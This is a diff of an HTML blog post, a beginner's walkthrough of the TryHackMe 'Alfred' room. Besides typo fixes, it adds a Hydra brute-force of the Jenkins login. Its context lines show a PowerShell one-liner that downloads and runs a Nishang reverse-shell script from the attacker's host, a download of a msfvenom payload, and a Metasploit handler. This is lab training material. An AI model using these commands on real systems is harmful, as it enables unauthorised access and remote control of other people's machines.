@@ -5,7 +5,7 @@
 <meta http-equiv="X-UA-Compatible" content="ie=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="">
-<meta name="description" content="Alfred - TryHackme&amp;rsquo;s Room Writeup This my first attempt at creating a writup, I tried putting every single step I took to solve this room. While providing enough (I think) details and descriptions so it is useful for noobs like me mostly. I started drafting this at the same time I managed to solve a question or even right after thinking a way to approach a solution for any of those." />
+<meta name="description" content="Alfred - TryHackme&amp;rsquo;s Room Writeup This is my first attempt at creating a write-up, I tried putting every single step I took to solve this room. While providing enough (I think) details and descriptions so it is useful for noobs like me mostly. I started drafting this at the same time I managed to solve a question or even right after thinking a way to approach a solution for any of those." />
 <meta name="keywords" content=", hacking, writeups, tryHackme" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
@@ -47,10 +47,10 @@ if (!doNotTrack) {
 
 
 <meta itemprop="name" content="Alfred_writeup.sh">
-<meta itemprop="description" content="Alfred - TryHackme&rsquo;s Room Writeup This my first attempt at creating a writup, I tried putting every single step I took to solve this room. While providing enough (I think) details and descriptions so it is useful for noobs like me mostly. I started drafting this at the same time I managed to solve a question or even right after thinking a way to approach a solution for any of those.">
+<meta itemprop="description" content="Alfred - TryHackme&rsquo;s Room Writeup This is my first attempt at creating a write-up, I tried putting every single step I took to solve this room. While providing enough (I think) details and descriptions so it is useful for noobs like me mostly. I started drafting this at the same time I managed to solve a question or even right after thinking a way to approach a solution for any of those.">
 <meta itemprop="datePublished" content="2020-08-16T14:00:11-04:00" />
 <meta itemprop="dateModified" content="2020-08-16T14:00:11-04:00" />
-<meta itemprop="wordCount" content="3724">
+<meta itemprop="wordCount" content="4362">
 <meta itemprop="image" content="https://tzero86-bits.netlify.app/"/>
 
 
@@ -61,7 +61,7 @@ if (!doNotTrack) {
 <meta name="twitter:image" content="https://tzero86-bits.netlify.app/"/>
 
 <meta name="twitter:title" content="Alfred_writeup.sh"/>
-<meta name="twitter:description" content="Alfred - TryHackme&rsquo;s Room Writeup This my first attempt at creating a writup, I tried putting every single step I took to solve this room. While providing enough (I think) details and descriptions so it is useful for noobs like me mostly. I started drafting this at the same time I managed to solve a question or even right after thinking a way to approach a solution for any of those."/>
+<meta name="twitter:description" content="Alfred - TryHackme&rsquo;s Room Writeup This is my first attempt at creating a write-up, I tried putting every single step I took to solve this room. While providing enough (I think) details and descriptions so it is useful for noobs like me mostly. I started drafting this at the same time I managed to solve a question or even right after thinking a way to approach a solution for any of those."/>
 
 
 
@@ -135,7 +135,7 @@ if (!doNotTrack) {
           <circle cx="12" cy="12" r="10"></circle>
           <polyline points="12 6 12 12 16 14"></polyline>
         </svg>
-        18 minutes
+        21 minutes
 
         
       </p>
@@ -165,7 +165,7 @@ if (!doNotTrack) {
 
       <div class="post-content">
         <h2 id="alfred---tryhackmes-room-writeup">Alfred - TryHackme&rsquo;s Room Writeup</h2>
-<p>This my first attempt at creating a writup, I tried putting every single step I took to solve this room. While providing enough (I think) details and descriptions so it is useful for noobs like me mostly. I started drafting this at the same time I managed to solve a question or even right after thinking a way to approach a solution for any of those. I even left some futile attemps of enumeration to be honest about my process of solving this. I hope somebody finds this useful somehow, it ceirtanly helped me to practice some tools and approaches. As I&rsquo;m still quite new to this, you can expect some errors in this post or maybe spot some things that an experienced person could probably solve better. I&rsquo;m learning, beware of the blog.</p>
+<p>This is my first attempt at creating a write-up, I tried putting every single step I took to solve this room. While providing enough (I think) details and descriptions so it is useful for noobs like me mostly. I started drafting this at the same time I managed to solve a question or even right after thinking a way to approach a solution for any of those. I even left some futile attempts of enumeration to be honest about my process of solving this. I hope somebody finds this useful somehow, it certainly helped me to practice some tools and approaches. As I&rsquo;m still quite new to this, you can expect some errors in this post or maybe spot some things that an experienced person could probably solve better. I&rsquo;m learning, beware of the blog.</p>
 <h2 id="task-1---getting-initial-access">[Task 1] - Getting Initial Access</h2>
 <p>For this room it seems we&rsquo;ll need <strong>Nishang</strong> in order to gain access to the machine by using <strong><em>reverse shell scripts</em></strong>.</p>
 <p>So lets start by listing the links to get this <strong>Nishang</strong> tool:</p>
@@ -177,7 +177,7 @@ if (!doNotTrack) {
 <blockquote>
 <p>Question #1: How many ports are open?</p>
 </blockquote>
-<p>Ok so for this question we&rsquo;ll run <strong>Nmap</strong> to enumerate any open ports. It is importan to note that the room description mentions this machine <strong>won&rsquo;t respond to ping (ICMP)</strong> requests. So we&rsquo;ll need to add switch to deal with that when running our scan.</p>
+<p>Ok so for this question we&rsquo;ll run <strong>Nmap</strong> to enumerate any open ports. It is important to note that the room description mentions this machine <strong>won&rsquo;t respond to ping (ICMP)</strong> requests. So we&rsquo;ll need to add a switch to deal with that when running our scan.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo nmap -A -Pn -p- 10.10.177.5
 
 </code></pre></div><p>We&rsquo;ll use the switch/flag <strong>-Pn</strong> to avoid <strong>Nmap</strong> doing a ping before starting the scans. Also we use <strong>-p-</strong> to scan for all the ports  instead of the most common ones.</p>
@@ -215,14 +215,14 @@ Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</spa
 
 </code></pre></div><p>Ok, so based on these results we now know how many ports are open.</p>
 <blockquote>
-<p>Question #2: What is the username and password for the log in panel(in the format username:password)?</p>
+<p>Question #2: What is the username and password for the login panel(in the format username:password)?</p>
 </blockquote>
 <p>Ok let&rsquo;s start by seeing what is being served in the port <strong>80</strong> of this machine.</p>
 <p><img src="https://i.imgur.com/FK0zWJh.png" alt="enter image description here">
 Ok so we get an email <em><strong>﻿alfred@wayneenterprises.com</strong></em>, and a picture. Let&rsquo;s see if we get any other useful information by inspecting the <strong>DOM</strong>.</p>
 <p>It seems there is not much info lying around the code of the page. It is always worth checking anyway.</p>
 <p>The next thing we can check, is to review if we may have any data encrypted into that image of Bruce Wayne.  So let&rsquo;s download it.</p>
-<p>At this point we would need a **passphrase ** if we want to attempt to extract any possibly hidden data in from this image. Since we don&rsquo;t have any piece of info so far that could act as a passphrase. We&rsquo;ll move forward from this for now. Also we are not even sure if this image has had any <strong>steganography</strong> job done.</p>
+<p>At this point we would need a <strong>passphrase</strong> if we want to attempt to extract any possibly hidden data in from this image. Since we don&rsquo;t have any piece of info so far that could act as a passphrase. We&rsquo;ll move forward from this for now. Also we are not even sure if this image has had any <strong>steganography</strong> job done.</p>
 <p>I would be wise to start scanning for some other directories we might be able to access. Let&rsquo;s use GoBuster.</p>
 <p>let&rsquo;s start a GoBuster scan with a small list first and see how it goes.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://10.10.177.5/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
@@ -248,12 +248,61 @@ Progress: <span style="color:#ae81ff">11841</span> / <span style="color:#ae81ff"
 Ok so we get a login form, we might as well try out some basic user:password combinations to see if maybe the security has overlooked something that basic.</p>
 <p>We can go with the basic <strong>admin:1234</strong>, <strong>admin:password</strong>, <strong>admin:admin</strong>, etc.</p>
 <p>Look at that, using <strong>admin:admin</strong> to log in has granted us access to Jenkins.</p>
-<p>If a super weak password was not available, I&rsquo;d probably try to force my way through this login form using <strong>Burp&rsquo;s Intruder</strong> or <strong>hydra</strong> with the <strong>rockyou.txt</strong> wordlist.</p>
-<p><img src="https://i.imgur.com/kzHXdI4.png" alt="Jenkins admin panel">
-So that gives us the answer to Question #2.</p>
+<p><img src="https://i.imgur.com/kzHXdI4.png" alt="Jenkins admin panel"></p>
+<p><strong><em>But wait, what if we didn&rsquo;t managed to find that super insecure credential?</em></strong> Well, in that case we should try to demonstrate how to use a combination of Burp and Hydra to brute force the login form. Let&rsquo;s look into that now.</p>
+<p>To start let&rsquo;s launch <strong>Burp Suite</strong>, we&rsquo;ll be using the integrated browser to navigate the site and review the details of the login request it gets sent when we attempt to log into Jenkins.</p>
+<p><img src="https://i.imgur.com/SBakfmQ.png" alt="Burp Suite"></p>
+<blockquote>
+<p><em>NOTE:</em> If you get an error about the integrated browser not able to run due to sandboxed settings. Got to Project Options -&gt; Misc -&gt; Check &ldquo;allow the embedded browser to run without a sandbox&rdquo;.</p>
+</blockquote>
+<p>Once you have Burp running in the <strong>Proxy -&gt; Intercept</strong> tab click on <strong>Open Browser</strong>. In the new Browser window open the machine IP at port 8080 to load the Jenkins login form.</p>
+<ul>
+<li>Remember to add the target IP to Burp&rsquo;s Scope, so it doesn&rsquo;t stop every single request from non-target related IPs.</li>
+</ul>
+<p>Ok so in order to brute force the login with Hydra, we need to Intercept a login request with Burp so we can get some important pieces of Information: <strong>[URL]</strong>, <strong>[UsernameField]</strong>, <strong>[PasswordField]</strong> and the <strong>[InvalidCredentialsErrorMessage]</strong>. These are all required for our Hydra attack.</p>
+<p>To get those, let&rsquo;s attempt to login with some invalid credentials just as <strong>test:test</strong>.</p>
+<p><img src="https://i.imgur.com/AKP9Wop.png" alt="Jenkins Login error"></p>
+<p>Let&rsquo;s see the request in Burp:</p>
+<p><img src="https://i.imgur.com/KL3wpw9.png" alt="Intercepted Login Request">
+As we can see in the intercepted request we get the rest of the pieces we were looking for. So now we have all of them ready for Hydra:</p>
+<ul>
+<li><strong>[URL]</strong>: /j_acegi_security_check</li>
+<li><strong>[UsernameField]</strong>: j_username</li>
+<li><strong>[PasswordField]</strong>: j_password</li>
+<li><strong>[InvalidCredentialsErrorMessage]</strong>: Invalid username or password</li>
+</ul>
+<p>We&rsquo;ll also need to know the <strong>[PORT]</strong> where the login forms lives, but we know that already from our Nmap scan(8080).</p>
+<p>So now let&rsquo;s try to configure <strong>Hydra</strong> so we can trigger that brute force attack.</p>
+<p>First let&rsquo;s review the required parameters we must specify and how our command its formated:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo hydra -s <span style="color:#f92672">[</span>PORT<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>IP<span style="color:#f92672">]</span> http-form-post <span style="color:#e6db74">&#34;/[URL]:[UsernameField]=^USER^&amp;[PasswordField]=^PASS^:[InvalidCredentialsErrorMessage]&#34;</span> -L rockyou.txt -P rockyou.txt
+</code></pre></div><p>So if we fill in the required data, and using rockyou.txt our command will look like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo hydra -s <span style="color:#ae81ff">8080</span> 10.10.192.65 http-form-post <span style="color:#e6db74">&#34;/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^:Invalid username or password&#34;</span> -L rockyou.txt -P rockyou.txt
+</code></pre></div><p>This might take a while to complete and we probably have to locate a better password/usernames wordlist, so it is worth mentioning <strong>SecLists</strong> as a great resource for those. Check <a href="https://github.com/danielmiessler/SecLists">this link</a>.</p>
+<p>After a while we should see something like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Hydra v9.1 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2020</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.
+
+Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2020-08-17 14:10:53
+<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">205761065451876</span> login tries <span style="color:#f92672">(</span>l:14344374/p:14344374<span style="color:#f92672">)</span>, ~12860066590743 tries per task
+<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking http-post-form://10.10.192.65:8080/j_acegi_security_check:j_username<span style="color:#f92672">=</span>^USER^&amp;j_password<span style="color:#f92672">=</span>^PASS^:Invalid username or password
+<span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 384.00 tries/min, <span style="color:#ae81ff">384</span> tries in 00:01h, <span style="color:#ae81ff">205761065451492</span> to <span style="color:#66d9ef">do</span> in 8930601799:07h, <span style="color:#ae81ff">16</span> active
+<span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 384.00 tries/min, <span style="color:#ae81ff">1152</span> tries in 00:03h, <span style="color:#ae81ff">205761065450724</span> to <span style="color:#66d9ef">do</span> in 8930601799:05h, <span style="color:#ae81ff">16</span> active
+<span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 381.71 tries/min, <span style="color:#ae81ff">2672</span> tries in 00:07h, <span style="color:#ae81ff">205761065449204</span> to <span style="color:#66d9ef">do</span> in 8984078456:30h, <span style="color:#ae81ff">16</span> active
+
+</code></pre></div><p>As you can see this attack is gonna take a while since rockyou.txt is quite a large list. So let&rsquo;s use one of the SecList&rsquo;s shorter lists called <a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/best1050.txt"><strong>best1050.txt</strong></a>.</p>
+<p>With the new list we get our result much faster:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo hydra -s <span style="color:#ae81ff">8080</span> 10.10.192.65 http-form-post <span style="color:#e6db74">&#34;/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^:Invalid username or password&#34;</span> -L best1050.txt -P best1050.txt -w <span style="color:#ae81ff">30</span>
+Hydra v9.1 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2020</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.
+
+Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2020-08-17 14:32:55
+<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">1102500</span> login tries <span style="color:#f92672">(</span>l:1050/p:1050<span style="color:#f92672">)</span>, ~68907 tries per task
+<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking http-post-form://10.10.192.65:8080/j_acegi_security_check:j_username<span style="color:#f92672">=</span>^USER^&amp;j_password<span style="color:#f92672">=</span>^PASS^:Invalid username or password
+<span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 384.00 tries/min, <span style="color:#ae81ff">384</span> tries in 00:01h, <span style="color:#ae81ff">1102116</span> to <span style="color:#66d9ef">do</span> in 47:51h, <span style="color:#ae81ff">16</span> active
+<span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 384.00 tries/min, <span style="color:#ae81ff">1152</span> tries in 00:03h, <span style="color:#ae81ff">1101348</span> to <span style="color:#66d9ef">do</span> in 47:49h, <span style="color:#ae81ff">16</span> active
+<span style="color:#f92672">[</span>8080<span style="color:#f92672">][</span>http-post-form<span style="color:#f92672">]</span> host: 10.10.192.65   login: admin   password: admin
+</code></pre></div><p>So that gives us the answer to Question #2 in a brute-forced way.</p>
 <p>Let&rsquo;s move to the next objective.</p>
 <blockquote>
-<p>Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: <strong><em>powershell iex (New-Object Net.WebClient).DownloadString(&lsquo;http://your-ip:your-port/Invoke-PowerShellTcp.ps1&rsquo;);Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port</em></strong></p>
+<p>Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: <strong><em>powershell iex (New-Object Net.WebClient).DownloadString(&lsquo;http://your-ip:your-port/Invoke-PowerShellTcp.ps1&rsquo;);Invoke-PowerShellTcp -Reverse -IPAddress your-IP -Port your-port</em></strong></p>
 </blockquote>
 <p>Well this objective kind of gives us quite a hit at what to do next. I figure we need to find a way to execute that on our newly accessed server. Let&rsquo;s take a look at what can we do in our Jenkins admin panel.</p>
 <p>If we take a look at the existing jobs in the server, we see this job called <strong>project</strong> which was last run months ago, but it also ran successfully.</p>
@@ -286,7 +335,7 @@ We navigate to the <strong>Shells</strong> folder and fire up our server like th
 listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">6666</span> ...
 </code></pre></div><p>That&rsquo;s done, now to paste our full command into the Jenkins Job Build command section.</p>
 <p><img src="https://i.imgur.com/aWPWDUy.png" alt="We enter our exploit command">
-After we enter the command, we click on <strong>Save</strong> button to save the changes.</p>
+After we enter the command, we click on the <strong>Save</strong> button to save the changes.</p>
 <p>Then we go back to the main project details page.
 Let&rsquo;s trigger a new build by clicking on <strong>Build Now</strong> button so we see if your command runs fine.</p>
 <p><img src="https://i.imgur.com/2RYq1y7.png" alt="Build Now button"></p>
@@ -318,7 +367,7 @@ Mode                LastWriteTime     Length Name
 PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\b</span>ruce<span style="color:#ae81ff">\D</span>esktop&gt; type user.txt
 <span style="color:#f92672">{</span>and-we-finally-get-the-flag-value<span style="color:#f92672">}</span>
 
-</code></pre></div><p>Well, we made it this far. We were able to exploit a Jenkins project/job and we managed to get a reverse shell successfully. With this we can mark Question #3 as completed and we can  also answer the question number 4.</p>
+</code></pre></div><p>Well, we made it this far. We were able to exploit a Jenkins project/job and we managed to get a reverse shell successfully. With this we can mark Question #3 as completed and we can  also answer question number 4.</p>
 <blockquote>
 <p>As it turns out we didn&rsquo;t need any <strong>GoBuster</strong> scans. They returned nothing useful anyways. However, we still we managed to get the initial access and it never hurts to do some extra enumeration.</p>
 </blockquote>
@@ -348,8 +397,8 @@ Saved as: payload.exe
 </code></pre></div><p>The rest of the plan follows the same approach we already did for  [Part 1]. We&rsquo;ll create a new PowerShell command to be added to the Jenkins job but this time we don&rsquo;t need the PS script as we&rsquo;ll be using the <strong>payload.exe</strong> that we just generated so the command varies a bit.</p>
 <p>In my case that command would look like this:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell <span style="color:#e6db74">&#34;(New-Object System.Net.WebClient).Downloadfile(&#39;http://10.13.0.34:8000/payload.exe&#39;,&#39;payload.exe&#39;)&#34;</span>
-</code></pre></div><p>We&rsquo;ll also need to setup a <strong>multi handler</strong> in <strong>metasploit</strong> to listen for our <strong>payload.exe</strong> reverse shell connection.</p>
-<p>In our terminal let&rsquo;s start <strong>msfconsole</strong> to fire up <strong>metasploit</strong> and create our listener.</p>
+</code></pre></div><p>We&rsquo;ll also need to setup a <strong>multi handler</strong> in <strong>Metasploit</strong> to listen for our <strong>payload.exe</strong> reverse shell connection.</p>
+<p>In our terminal let&rsquo;s start <strong>msfconsole</strong> to fire up <strong>Metasploit</strong> and create our listener.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ msfconsole
                                                   
 <span style="color:#75715e"># cowsay++</span>
@@ -403,7 +452,7 @@ Exploit target:
    --  ----
    <span style="color:#ae81ff">0</span>   Wildcard Target
 
-</code></pre></div><p>As we can see, we just need to set <strong>[LHOST]</strong> and <strong>[LPORT]</strong> to the right values, let&rsquo;s do that.  And type in <strong>exploit</strong> or <strong>run</strong> to start our <strong>metasploit listener/handler</strong>.</p>
+</code></pre></div><p>As we can see, we just need to set <strong>[LHOST]</strong> and <strong>[LPORT]</strong> to the right values, let&rsquo;s do that.  And type in <strong>exploit</strong> or <strong>run</strong> to start our <strong>Metasploit listener/handler</strong>.</p>
 <blockquote>
 <p>Make sure to set the <strong>[LPORT]</strong> to the port you specified when creating the <strong>payload.exe</strong> with <strong>msfvenom</strong>.</p>
 </blockquote>
@@ -640,7 +689,7 @@ type root.txt
 
 C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onfig&gt;
 
-</code></pre></div><p>And that&rsquo;s all there is to this room. I hope you find this useful, I tried to detail pretty much every step I took to solve the room. I&rsquo;m sure there is some other ways to go about solving this room, I tried to operate within my noob-level expertise and I think the end result could prove appealing to other noob-level ethical hackers out there.</p>
+</code></pre></div><p>And that&rsquo;s all there is to this room. I hope you find this useful, I tried to detail pretty much every step I took to solve the room. I&rsquo;m sure there are other ways to go about solving this room, I tried to operate within my noob-level expertise and I think the end result could prove useful to other noob-level ethical hackers out there.</p>
 <p>As usual, happy hacking.</p>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 
@@ -650,11 +699,9 @@ C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</spa
     </div>
     <div class="center">
         <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
-        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>    
-    </div>
-    
+        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
+        <br> 
 </div>
-
 
       </div>
     </article>
@@ -677,7 +724,7 @@ C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</spa
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        3724 Words
+        4362 Words
       </p>
 
       <p>
@@ -792,6 +839,13 @@ C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</spa
         </div>
 
         <div class="pagination__buttons">
+          
+            <span class="button previous">
+              <a href="https://tzero86-bits.netlify.app/posts/easyctf_writeup/">
+                <span class="button__icon">←</span>
+                <span class="button__text">EasyCTF_writeup.sh</span>
+              </a>
+            </span>
           
 
           
